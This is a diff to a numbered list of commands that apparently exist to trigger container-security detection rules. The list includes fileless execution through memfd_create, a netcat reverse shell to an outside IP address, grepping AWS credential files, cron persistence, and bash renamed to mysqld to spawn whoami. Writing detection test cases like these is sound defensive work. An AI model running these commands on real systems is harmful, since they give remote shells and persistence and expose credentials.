@@ -77,44 +77,20 @@ curl -x socks4://proxy.example.com http://www.example.com/
 #reference link: https://stackoverflow.com/questions/63208333/using-memfd-create-and-fexecve-to-run-elf-from-memory
 #currently, seperate container is created to pull the image: "angelrita/memfd-exec:latest". But, poc binary is also present in base-ubuntu image. we can just run following commmand. 
 ./memfd-exec
+
+or pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: process-exec-from-memory
+spec:
+  containers:
+  - name: process-exec-from-memory
+    image: angelrita/memfd-exec:latest
 ------------------------------------------------------
 15. Netcat Reverse Shell Execution
 command:
 nc -e /bin/bash 10.113.107.226 4444
-
-There are many other variations are covered in the rule.
-details:
-Inside container:
-//////////////////
-FROM alpine:latest
-
-# Install netcat (OpenBSD version for better compatibility)
-RUN apk add --no-cache netcat-openbsd
-
-# Set working dir
-WORKDIR /app
-
-# Run an example nc command (e.g., listen on port 8080)
-CMD ["nc", "-lk", "-p", "8080"]
-/////////////////
-docker build -t nc-server:latest .
-docker run --rm -p 8080:8080 nc-server:latest
-#from remote machine
-nc localhost 8080
-/////////////////
-apiVersion: v1
-kind: Pod
-metadata:
-  name: nc-server
-spec:
-  containers:
-  - name: nc
-    image: nc-server:latest
-    imagePullPolicy: Never
-    ports:
-    - containerPort: 8080
-
-
 ------------------------------------------------------
 16. Usage of Steganography tools
 steghide embed -cf -ef secret.txt test.jpg
@@ -190,10 +166,11 @@ grep aws_access_key_id ~/.aws/credentials; fgrep secretaccesskey somefile.txt; g
 32. Schedule Cron Jobs
 #run start of the hour
 crontab -e
-0 * * * * /usr/bin/python /path/to/your/script.py
+#or write to crontab file
+#echo "0 * * * * /usr/bin/python /path/to/your/script.py" > crontab
 ------------------------------------------------------
-33. DB program spawned process --- to do
-mysqld -> whoami
+33. DB program spawned process
+cp /bin/bash mysqld; ./mysqld -c whoami
 ------------------------------------------------------
 34. Launch Remote File Copy Tools in Container
 scp test@10.113.107.226:/home/Downloads/test.png .
